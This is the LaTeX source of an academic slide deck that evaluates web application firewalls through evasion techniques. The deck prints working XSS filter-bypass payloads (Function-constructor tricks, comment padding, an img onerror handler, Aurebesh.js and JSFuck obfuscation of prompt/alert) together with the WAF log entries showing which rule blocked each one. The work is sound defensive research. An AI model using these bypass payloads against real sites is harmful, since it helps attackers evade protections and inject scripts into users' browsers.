% A pure minimalistic LaTeX-Beamer theme for everyone to use.
% Copyright (C) 2020 Kai Norman Clasen

% This program is free software: you can redistribute it and/or modify
% it under the terms of the GNU General Public License as published by
% the Free Software Foundation, either version 3 of the License, or
% (at your option) any later version.

% This program is distributed in the hope that it will be useful,
% but WITHOUT ANY WARRANTY; without even the implied warranty of
% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
% GNU General Public License for more details.

% You should have received a copy of the GNU General Public License
% along with this program.  If not, see <https://www.gnu.org/licenses/>.

% This file is part of beamerthemepureminimalistic.

% If problems/bugs are found or enhancements are desired, please contact
% me over: https://github.com/kai-tub/latex-beamer-pure-minimalistic

\documentclass[aspectratio=169]{beamer}
% should also look nice for the classic aspectratio
% of course, than the text has to be refitted
% \documentclass{beamer}
% Will be ignored if LuaTeX engine is used
\usepackage[utf8]{inputenc}
% \usepackage{tikz}
\usepackage{listings}
\usetheme[darkmode, nofooterlogo]{pureminimalistic}
% \renewcommand{\pageword}{}
% \renewcommand{\logoheader}{\vspace{1.5em}}
\usepackage[backend=biber, doi=false, maxbibnames=2, maxcitenames=2,%
            style=numeric, sorting=none, url=false, eprint=false]{biblatex}
\addbibresource{demo_bib.bib}
% this makes it possible to add backup slides, without counting them
% \usepackage{appendixnumberbeamer}
\renewcommand{\appendixname}{\texorpdfstring{\translate{appendix}}{appendix}}

\newcommand{\supertext}[1]{\fontsize{30}{40}\selectfont #1}


% if loaded after begin{document} a warning will appear: "pdfauthor already used"
\title[Evaluation of Web Application Firewalls using Firewall Evasion Techniques]{Evaluation of Web Application Firewalls \\ using Firewall Evasion Techniques}
\author{Sebastian Stecher}
% \subtitle[subtitle]{Subtitle}
\institute{HDBW Hochschule der Bayerischen Wirtschaft}
\date{\today}

\begin{document}
% has to be loaded outside of a frame to work!
\maketitle

% code listing config
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
\lstdefinestyle{ruleStyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	keywordstyle=\color{magenta},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurple},
	identifierstyle=\color{blue},
	rulecolor=\color{black},
	basicstyle=\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	frame=single,
	morekeywords={test, do, <file>},
	aboveskip=1\baselineskip,
	escapeinside=\^\^
}

\lstdefinestyle{basicStyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurple},
	rulecolor=\color{black},
	basicstyle=\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	frame=single,
	aboveskip=1\baselineskip
}


% For longer table of contents, I find it cleaner to
% use no footline.
\begin{frame}[plain, noframenumbering]{Outline}
	\tableofcontents
\end{frame}

\section{Relevance}
\begin{frame}{Relevance}
	\begin{vfilleditems}
		\item<2-> Initial Question: How can a WAF help protect my WA?
		\item<3-> Expectation: Plain malicious requests are mostly caught
		\item<4-> Defense in Depth: An additional layer of protection
		\item<5-> Final Question: How well does a WAF protect against \textit{targeted} malicious requests?
	\end{vfilleditems}
\end{frame}

\section*{Relevance Conclusion}
\begin{frame}[plain, noframenumbering]
	\centering
	\vfill
	\supertext{Evaluation of WAF(s) using Firewall Evasion Techniques}
	\vfill
\end{frame}

\section{Related work}
\begin{frame}[fragile]{Related work}
	\begin{vfilleditems}
		\item<2-> Fuzz testing \cite{rw/demetrio}
		\item<3-> Payload clustering and selection using reinforcement learning \cite{rw/mohammad}
		\item<4-> Bridging test input generation across different
		types of injection attack \cite{rw/derLI}
		\item<5-> Commonality: black box testing
	\end{vfilleditems}
\end{frame}

\section{Proposal}
\begin{frame}[fragile]{Proposal}
	\begin{vfilleditems}
		\item<2-> During WAF evaluation likely more information available than in typical black box scenario
		\item<3-> Firewall log
		\item<4-> But: keep attacker perspective
		\item<5-> Use firewall evasion techniques
	\end{vfilleditems}
\end{frame}

\section*{Proposal Conclusion}
\begin{frame}[plain, noframenumbering]
	\centering
	\vfill
	\supertext{Use firewall evasion techniques in a gray box scenario to efficiently evaluate web application firewalls against targeted malicious attacks}
	\vfill
\end{frame}

\section{Firewall evasion techniques}
\begin{frame}[fragile]{Firewall evasion techniques}
	\begin{vfilleditems}
		\item<2-> Attacker: \verb|alert(1)|
		\item<3-> WAF:
		\begin{lstlisting}[style=ruleStyle, language=XML]
<MatchedData>"alert("</MatchedData>
\end{lstlisting}
		\item<4-> Attacker: \verb|alert`1`|
		\item<5-> WAF: \  \includegraphics[width=.07\linewidth]{thumbsup.png}
	\end{vfilleditems}
\end{frame}

\begin{frame}[fragile]{Firewall evasion techniques - examples}
	\begin{columns}
		\column{0.5\textwidth}<2->
		Various Payloads
		\begin{vfilleditems}
			\item<3-> Unicode escaping in JSON: \verb|"alert\u0028\"JSON\")"|
			\item<4-> Unicode normalization: \  \includegraphics[width=.07\linewidth]{UFE35.png} -> \includegraphics[width=.02\linewidth]{U0028.png}
			\item<5-> Payload size
		\end{vfilleditems}
		\column{0.5\textwidth}<6->
		XSS Payloads
		\begin{vfilleditems}
			\item<7-> HTML Character References: \verb|&lpar;| {\color{red}=} \verb|&#x28;| {\color{red}=} \verb|&#40;| {\color{red}=} \includegraphics[width=.02\linewidth]{U0028.png}
			\item<8-> JavaScript Comment Substitution: \verb|var/**/s=/**/5|
			\item<9-> JSFuck: JavaScript in 6 characters \verb|(![]+[])[+!+[]]+...| \  \cite{mk/jsfuck}
		\end{vfilleditems}
	\end{columns}
\end{frame}

\section{Evaluation methodology}
\begin{frame}[fragile]{Evaluation methodology - in general}
	\begin{vfilleditems}
		\item<2-> Choose PoC XSS payload
		\item<3-> Obscure payload using evasion technique
		\item<4-> Send payload towards WAF
		\item<5-> If
		\begin{vfilleditems}
			\item<6-> blocked: check firewall log for reasons
			\item<7-> bypassed: test received payload for validity
		\end{vfilleditems}
	\end{vfilleditems}
\end{frame}

\begin{frame}[fragile]{Evaluation methodology - developing bypassing payloads}
	\begin{vfilleditems}
		\item<2-> Multiple iterations
		\item<3-> First iteration: identify potentially effective evasion techniques
		\item<4-> Following iterations:
		\begin{vfilleditems}
			\item<5-> check WAF log for blocked reason(s)
			\item<6-> accordingly apply identified evasion technique(s) to the payload
			\item<7-> repeat until a bypassing payload is found or no more fitting evasion techniques are available
		\end{vfilleditems}
	\end{vfilleditems}
\end{frame}

\section{Function constructor}
\begin{frame}[fragile]{Function constructor}
	\begin{vfilleditems}
		\item<2-> Allows to create functions which execute in the global scope
		\item<3-> Can be used directly to create and execute a function:
		\begin{lstlisting}[style=basicStyle, language=Python]
new Function("alert(1)")()
\end{lstlisting}
		\item<4-> Can be accessed via built-in objects and functions:
		\begin{lstlisting}[style=basicStyle, language=Python]
Error.constructor.constructor("alert(1)")()
isNaN.constructor("alert(1)")()
\end{lstlisting}
	\end{vfilleditems}
\end{frame}

\begin{frame}[fragile]{Function constructor - prompt(s,s) blocked}
	% \begin{lstlisting}[style=ruleStyle, language=XML, caption={prompt(1,2) blocked}, label=lst:promptblocked]
	\begin{lstlisting}[style=ruleStyle, language=XML]
<payload>var s = 'secret'; prompt(s, s)</payload>

<message>"Javascript method detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Function constructor - prompt(s,s) bypass 1}
	\begin{lstlisting}[style=basicStyle, language=Python]
[]['constructor']['constructor'](`var s = 'secret'; promp` + `t(s, s)`)()
\end{lstlisting}
\end{frame}


\begin{frame}[fragile]{Function constructor - prompt(s,s) bypass 1 - invalid}
	\begin{lstlisting}[style=basicStyle, language=Python]
<img src="1" onerror="[]['constructor']['constructor'](`var" s="secret" ;promp`="" +="" `t(s,="" s)`)()="">
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Function constructor - prompt(s,s) bypass 2}
	\begin{lstlisting}[style=basicStyle, language=Python]
[]['constructor']['constructor'](`var/**/s/**/=/**/    'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
\end{lstlisting}
\end{frame}

\section*{Function constructor demo}
\begin{frame}[plain, noframenumbering]
	\centering
	\vfill
	\supertext{Function constructor demo}
	\vfill
\end{frame}

\section{Aurebesh.js}

\begin{frame}[fragile]{Aurebesh.js}
	\begin{vfilleditems}
		\item<2-> Similar to JSFuck \cite{mk/jsfuck}, also created by Martin Kleppe \cite{mk/aurebesh}
		\item<3-> Write valid JavaScript statements calling \verb|alert(1)|
		\item<4-> Using the characters \verb|() + [] ! " = {}| and 1 to 9 other characters of choice
	\end{vfilleditems}
\end{frame}

\begin{frame}[fragile]{Aurebesh.js - How it works part 1}
	\begin{lstlisting}[style=basicStyle]
A = ''              // empty string
B = !A + A          // "true"
C = !B + A          // "false"
D = A + {}          // "[object Object]"
E = B[A++]          // "t" = "true"[0]
F = B[G = A]        // "r" = "true"[1]
H = ++G + A         // 2, 3
I = D[G + H]        // "c"
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Aurebesh.js - How it works part 2}
	\begin{lstlisting}[style=basicStyle]
B[
  I +=              // "c"
    D[A] +          // "o" = "object"[0]
    (B.C+D)[A] +    // "n" = "undefined"[1]
    C[H] +          // "s" = "false"[3]
    E +             // "t"
    F +             // "r"
    B[G] +          // "u" = "true"[2]
    I +             // "c" = "[object]"[5]
    E +             // "t"
    D[A] +          // "o" = "[object]"[1]
    F               // "r"
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Aurebesh.js - How it works part 3}
	\begin{lstlisting}[style=basicStyle]
][
  I                 // "constructor"
](
  C[A] +            //  "a"
  C[G] +            //  "l"
  B[H] +            //  "e"
  F +               //  "r"
  E +               //  "t"
  "(A)"             // "(1)"
)()
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Aurebesh.js - prompt(1,2) blocked}
	% \begin{lstlisting}[style=ruleStyle, language=XML, caption={prompt(1,2) blocked}, label=lst:promptblocked]
	\begin{lstlisting}[style=ruleStyle, language=XML]
<payload>prompt(1,2)</payload>

<message>"Javascript method detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Aurebesh.js - prompt(1,2) bypass}
	% \begin{lstlisting}[style=basicStyle, language=Python, caption={prompt(1,2) bypass in Aurebesh.js}, label={lst:aurebeshpromptbypass}]
	\begin{lstlisting}[style=basicStyle, language=Python]
A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')()
\end{lstlisting}
\end{frame}

\section*{Aurebesh demo}
\begin{frame}[plain, noframenumbering]
	\centering
	\vfill
	\supertext{Aurebesh.js demo}
	\vfill
\end{frame}

% \section{Aspect ratio}
% \begin{frame}[fragile]{Aspect ratio}
% 	This pdf uses a 16:9 aspect ratio. To utilize
% 	this version, simply use:
% 	\begin{verbatim}
%     \documentclass[aspectratio=169]{beamer}
%     \end{verbatim}
% 	\vfill
% 	The default is a 4:3 aspect ratio.
% 	\begin{verbatim}
%     \documentclass{beamer}
%   \end{verbatim}
% \end{frame}
%
% \section{vfilleditems}
% \begin{frame}{Using itemize}
% 	\begin{itemize}
% 		\item I like it to have my bullet points
% 		\item evenly spaced from one another
% 		\item then few bullet points, are not crammed on
% 		      the upper part of the slide
% 		      like it is right now with itemize
% 	\end{itemize}
% \end{frame}
%
% \begin{frame}[fragile]{Using vfilleditems}
% 	\begin{verbatim}
%     Use the provided \vfilleditems environment
%     to create nicely spaced bullet points.
%
%     \begin{vfilleditems}
%       \item I like it to have my bullet points
%       \item evenly spaced from one another
%       \item then few bullet points, are not crammed on
%       the upper part of the slide
%     \end{vfilleditems}
%     \end{verbatim}
% \end{frame}
%
% \begin{frame}{Using vfilleditems}
% 	\begin{vfilleditems}
% 		\item I like it to have my bullet points
% 		\item evenly spaced from one another
% 		\item then few bullet points, are not crammed on
% 		the upper part of the slide
% 	\end{vfilleditems}
% \end{frame}
%
% \begin{frame}{Using vfilleditems}
% 	\begin{vfilleditems}
% 		\item Note that the overlay specification
% 		is a bit different to \emph{itemize}
% 		\item For grouped overlay specifications, simply add it
% 		directly after the environment:
% 		\begin{vfilleditems}
% 			\item \texttt{\textbackslash{}begin\{vfilleditems\}<+->}
% 		\end{vfilleditems}
% 	\end{vfilleditems}
% \end{frame}
%
%
% \section{Fonts}
% \begin{frame}[fragile]{Fonts}
% 	Fonts:
%
% 	{\small This is small}
%
% 	This is normal size
%
% 		{\large This is large}
% 	\vfill
% 	Per default the \emph{Fira Font} Package is
% 	used. The \emph{Noto Font} is also bundled into this
% 	package.
% \end{frame}
%
% \begin{frame}[fragile]{Fonts}
% 	To use \emph{Noto} instead of \emph{Fira Fonts}
% 	\begin{verbatim}
%     \usetheme[noto]{pureminimalistic}
%   \end{verbatim}
% 	\vfill
% 	To disable the \emph{Fira Fonts} and use the default font
% 	\begin{verbatim}
%     \usetheme[customfont]{pureminimalistic}
%   \end{verbatim}
% \end{frame}
%
% \section{Color}
% \begin{frame}[fragile]{Color}
% 	To overwrite the theme color
% 	\begin{enumerate}
% 		\item Define a new color
% 		\item redefine the themes color (before document begins)
% 	\end{enumerate}
% \end{frame}
%
% \begin{frame}[fragile]{Change color example}
% 	\small
% 	\begin{verbatim}
%   \usetheme{pureminimalistic}
%   \definecolor{textcolor}{RGB}{0, 0, 120}
%   \definecolor{title}{RGB}{0, 0, 0}
%   \definecolor{footercolor}{RGB}{133, 133, 133}
%   \definecolor{bg}{RGB}{25, 116, 210}
%
%   \renewcommand{\beamertextcolor}{textcolor}
%   \renewcommand{\beamerbgcolor}{bg}
%   \renewcommand{\beamerfootertextcolor}{footercolor}
%   \renewcommand{\beamertitlecolor}{title}
%   \end{verbatim}
% \end{frame}
%
% \begin{frame}[fragile]{Dark mode}
% 	I've included a simple way to use a dark mode
% 	color theme. To use the dark color mode, provide the \texttt{darkmode}
% 	option.
% 	\begin{verbatim}
%     \usetheme[darkmode]{pureminimalistic}
%     \end{verbatim}
% 	Sometimes, the logos have to be changed to look nice on a
% 	dark background. For now, I am simply loading different
% 	files if \texttt{darkmode} is used.
% \end{frame}
%
% \section{Graphics}
% \begin{frame}{Logos}
% 	Commands setting the logos:
% 	\begin{itemize}
% 		\item \texttt{\textbackslash{}logotitle} -- Command used for the title page.
% 		      Here \texttt{\textbackslash{}linewidth} corresponds to the entire paper width.
% 		\item \texttt{\textbackslash{}logoheader} -- Command used for the header.
% 		      Here \texttt{\textbackslash{}linewidth} corresponds to a smaller box,
% 		      as the horizontal space is shared with the title.
% 		\item \texttt{\textbackslash{}logofooter} -- Command used for the footer.
% 		      Here \texttt{\textbackslash{}linewidth} corresponds to a smaller box,
% 		      as the horizontal space is shared with the footer text.
% 	\end{itemize}
% \end{frame}
%
% \begin{frame}[fragile]{Logos -- Load own logo}
% 	To use your own logos, simply redefine the commands and adjust the sizes.
% 	\begin{verbatim}
%  \renewcommand{\logotitle}{\includegraphics%
%    [width=.2\linewidth]{alternative_logo/gameboy.png}}
%  \renewcommand{\logoheader}{\includegraphics%
%    [width=.5\linewidth]{alternative_logo/gameboy.png}}
%  \renewcommand{\logofooter}{\includegraphics%
%    [width=.15\linewidth]{alternative_logo/console.png}}
%   \end{verbatim}
% \end{frame}
%
% \begin{frame}[fragile]{Logos -- Disable logo}
% 	To disable the logo, overwrite the default logo command with an empty
% 	command.
% 	\begin{verbatim}
%  \renewcommand{\logoheader}{}
%   \end{verbatim}
% 	You may want to add some vertical space if you wish to delete the \texttt{logoheader}.
% 	\begin{verbatim}
%  \renewcommand{\logoheader}{\vspace{1.5em}}
%   \end{verbatim}
% \end{frame}
%
% \begin{frame}{Figures}
% 	I also changed the default caption settings to not
% 	include \texttt{Figure:} and reduced the font size.
% 	\begin{figure}[H]
% 		\centering
% 		\begin{columns}[T]
% 			\begin{column}{.3\linewidth}
% 				\includegraphics[width=\linewidth]{linuxa.jpg}
% 				\caption{Example A}
% 			\end{column}
% 			\begin{column}{.3\linewidth}
% 				\includegraphics[width=\linewidth]{linuxa.jpg}
% 				\caption{Example B}
% 			\end{column}
% 		\end{columns}
% 	\end{figure}
% \end{frame}
%
% \begin{frame}[fragile]{Figures -- Set background watermark}
% 	There is no extra option to define a background watermark, but here
% 	is a command that could be used to create one manually:
% 	\vfill
% 	\begin{verbatim}
% \setbeamertemplate{background}{%
%   \tikz[overlay,remember picture]%
%   \node[opacity=0.8]at (current page.center)%
%   {\includegraphics[width=.2\linewidth]%
%   {linuxa.jpg}};%
% }
%   \end{verbatim}
% \end{frame}
%
% {
% \setbeamertemplate{background}{%
% 	\tikz[overlay,remember picture]%
% 	\node[opacity=0.8]at (current page.center)%
% 	{\includegraphics[width=.2\linewidth]%
% 		{linuxa.jpg}};%
% }
% \begin{frame}{Figures -- Set background watermark}
% 	Usually you would add this command to specific
% 	frames by enclosing this command and all desired frames with
% 	curly brackets.
% 	\vfill
% 	See the source code of this \emph{*.tex} file for an
% 	example.
% \end{frame}
% }
%
% \section{Footer options}
% \begin{frame}[fragile]{Disable footer}
% 	If you do not want to use a footer, disable it with:
% 	\begin{verbatim}
%     \usetheme[nofooter]{pureminimalistic}
%   \end{verbatim}
% \end{frame}
%
% \begin{frame}[fragile]{Show max slide numbers}
% 	For these slides, I used the option to
% 	show the maximum number of slides. To activate it
% 	one has to activate it with:
% 	\begin{verbatim}
%     \usetheme[showmaxslides]{pureminimalistic}
%   \end{verbatim}
% 	Usually, I prefer to not show the maximum number of
% 	slides, as the people tend to lose focus if they know
% 	the last few slides are shown.
% \end{frame}
%
% \begin{frame}[fragile]{Remove footer logo}
% 	If you wish to remove the footer logo \emph{and}
% 	move the page number to the right parts use:
% 	\begin{verbatim}
%     \usetheme[nofooterlogo]{pureminimalistic}
%   \end{verbatim}
% \end{frame}
%
% \begin{frame}[fragile]{Change Page word}
% 	If you wish to remove or change the word \emph{Page}
% 	in the footer, change the value with
% 	\begin{verbatim}
%     \renewcommand{\pageword}{Seite}
%   \end{verbatim}
% \end{frame}

\section{Citations}
\begin{frame}[allowframebreaks]{Citations}
	I've also changed the bibliography options to be minimalistic:

	Just showing a simple \texttt{\textbackslash{}cite} \cite{AlexNet}
	\vfill
	\printbibliography
\end{frame}

\appendix % do not count the following slides for the total number
\section*{Backup Slides}
\begin{frame}[plain, noframenumbering]
	\centering
	\vfill
	{\fontsize{40}{50}\selectfont Backup Slides}
	\vfill
\end{frame}

% \begin{frame}{What happened to the page numbering?}
% 	\begin{itemize}
% 		\item I've used the \texttt{appendixnumberbeamer}
% 		      package, which resets the frame counting after calling
% 		      \texttt{\textbackslash{}appendix}
% 		\item Depending on the used pdf viewer, the total
% 		      count of frames shouldn't include the backup slides and
% 		      won't demotivate the audience.
% 		\item Usually, I would use a \texttt{plain} frame
% 		      for the backup slides.
% 	\end{itemize}
% \end{frame}

\end{document}
